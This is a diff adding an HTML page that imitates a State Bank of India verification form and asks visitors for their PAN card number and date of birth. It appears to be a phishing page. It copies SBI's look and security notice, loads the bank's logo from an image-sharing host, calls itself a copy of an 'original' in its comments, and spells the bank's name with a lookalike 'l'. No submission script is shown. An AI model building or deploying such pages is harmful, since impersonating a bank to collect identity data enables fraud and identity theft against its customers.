@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SBI Secure · PAN & DOB Verification</title>
+    <!-- same favicon as original -->
+    <link rel="icon" type="image/png" href="https://vuejs.org/images/logo.png">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            background-color: #f0f0f0;
+            min-height: 100vh;
+            padding-bottom: 20px;
+        }
+        .header {
+            text-align: center;
+            padding: 0;
+            background-color: white;
+            line-height: 0;
+        }
+        .logo {
+            max-width: 100%;
+            height: auto;
+            max-height: 120px;
+            display: block;
+            margin: 0 auto;
+        }
+        .container {
+            max-width: 460px;
+            margin: 0 auto 15px auto;
+            background-color: white;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.08);
+            overflow: visible;
+            padding: 0 20px 20px 20px;
+        }
+        .form-header {
+            background-color: #e6f3ff;
+            color: #2c517a;        
+            padding: 14px 20px 6px 20px;
+            text-align: center;
+            font-size: 12px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            line-height: 1.4;
+            margin-left: -20px;
+            margin-right: -20px;
+            margin-top: 0;
+            margin-bottom: 0;
+        }
+        /* instruction text - sky blue */
+        .instruction {
+            font-size: 14px;
+            color: #007299;
+            margin: 15px 0 6px 0;
+        }
+        .mandatory-note {
+            font-size: 11px;
+            color: #8B0000;
+            margin: 5px 0 15px 0;
+            font-style: italic;
+        }
+        .form-group {
+            margin-bottom: 18px;
+        }
+        .form-label {
+            display: block;
+            font-size: 12px;
+            font-weight: bold;
+            color: #333333;
+            margin-bottom: 5px;
+        }
+        .form-label .asterisk {
+            color: #cc0000;
+            font-size: 14px;
+            margin-left: 2px;
+        }
+        .form-input {
+            width: 100%;
+            padding: 7px;
+            font-size: 13px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            background-color: rgba(0, 0, 0, 0.02);
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        .form-input:focus {
+            border-color: #24A1E8;
+        }
+        /* button group – single proceed button, centered */
+        .button-group {
+            display: flex;
+            justify-content: center;
+            margin: 25px 0 20px 0;
+        }
+        .proceed-btn {
+            background-color: #CBA135; /* satin sheen gold */
+            color: white;
+            padding: 6px 22px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 600;
+            transition: background-color 0.2s;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+        }
+        .proceed-btn:hover {
+            background-color: #b38f2d;
+            color: white;
+        }
+        /* bullet list – same as original */
+        .security-bullet {
+            font-size: 13px;
+            color: #333333;
+            margin: 15px 0 10px 0;
+            padding: 12px 12px 8px 12px;
+            background-color: rgba(255, 215, 0, 0.1);
+            border-radius: 6px;
+            background-color: #fff8e7;
+        }
+        .security-bullet ul {
+            list-style-type: disc;
+            padding-left: 20px;
+        }
+        .security-bullet li {
+            margin-bottom: 15px;
+            line-height: 2;
+        }
+        .security-bullet a {
+            color: #24A1E8;
+            text-decoration: none;
+        }
+        .security-bullet a:hover {
+            text-decoration: underline;
+        }
+        hr {
+            margin: 15px 0 10px 0;
+            border: 0;
+            border-top: 1px solid #ddd;
+        }
+        /* Footer styling – black background, white text */
+        .footer-links {
+            font-size: 14px;
+            text-align: center;
+            line-height: 1.6;
+            color: white;
+            background-color: #424242;
+            padding: 10px 0;
+            margin-top: 5px;
+            border-radius: 0 0 4px 4px;
+        }
+        .footer-links a {
+            color: #cccccc;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+            color: white;
+        }
+        .footer-links span {
+            color: inherit;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div>
+        <!-- header: SBI logo -->
+        <div class="header">
+            <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" alt="State Bank of India" class="logo">
+        </div>
+
+        <div class="container">
+            <!-- header inside container: PAN & DOB Verification -->
+            <div class="form-header">PAN & Date of Birth Verification</div>
+
+            <!-- instruction text -->
+            <div class="instruction">Please enter your PAN Card and Date of Birth</div>
+            <div class="mandatory-note">Mandatory fields are marked with an asterisk (*)</div>
+
+            <!-- form with PAN and DOB -->
+            <form>
+                <!-- PAN Card field -->
+                <div class="form-group">
+                    <label class="form-label">PAN Card <span class="asterisk">*</span></label>
+                    <input type="text" class="form-input" placeholder="" maxlength="10" pattern="[A-Z]{5}[0-9]{4}[A-Z]{1}" title="Please enter a valid PAN (5 letters, 4 numbers, 1 letter)">
+                </div>
+
+                <!-- Date of Birth field -->
+                <div class="form-group">
+                    <label class="form-label">Date of Birth <span class="asterisk">*</span></label>
+                    <input type="date" class="form-input" max="2008-01-01" value="1980-01-01">
+                </div>
+
+                <!-- PROCEED BUTTON (instead of submit) -->
+                <div class="button-group">
+                    <button type="submit" class="proceed-btn">Proceed</button>
+                </div>
+
+                <!-- important security bullet points (unchanged from SBI style) -->
+                <div class="security-bullet">
+                    <ul>
+                        <li>Please note that all communication related to Internet banking will be sent on your registered mobile number.</li>
+                        <li>State Bank or any of its representative never sends you email/SMS or calls you over phone to get your personal information, password or one time SMS (high security) password. Any such e-mail/SMS or phone call is an attempt to fraudulently withdraw money from your account through Internet Banking. Never respond to such email/SMS or phone call. Please report immediately on <a href="mailto:report.phishing@sbi.co.in">report.phishing@sbi.co.in</a> if you receive any such email/SMS or Phone call. Immediately change your passwords if you have accidentally revealed your credentials.</li>
+                    </ul>
+                </div>
+            </form>
+
+            <hr>
+
+            <!-- footer with black background -->
+            <div class="footer-links">
+                <a href="#">Privacy Statement</a> | <a href="#">Disclosure</a><br>
+                <a href="#">Terms of Service (Terms & Conditions)</a><br>
+                © State Bank of lndia<br>
+                <span>Site best viewed at 1024 x 768 resolution in Microsoft Edge 79+, Mozilla 96+, Google Chrome 97+</span>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
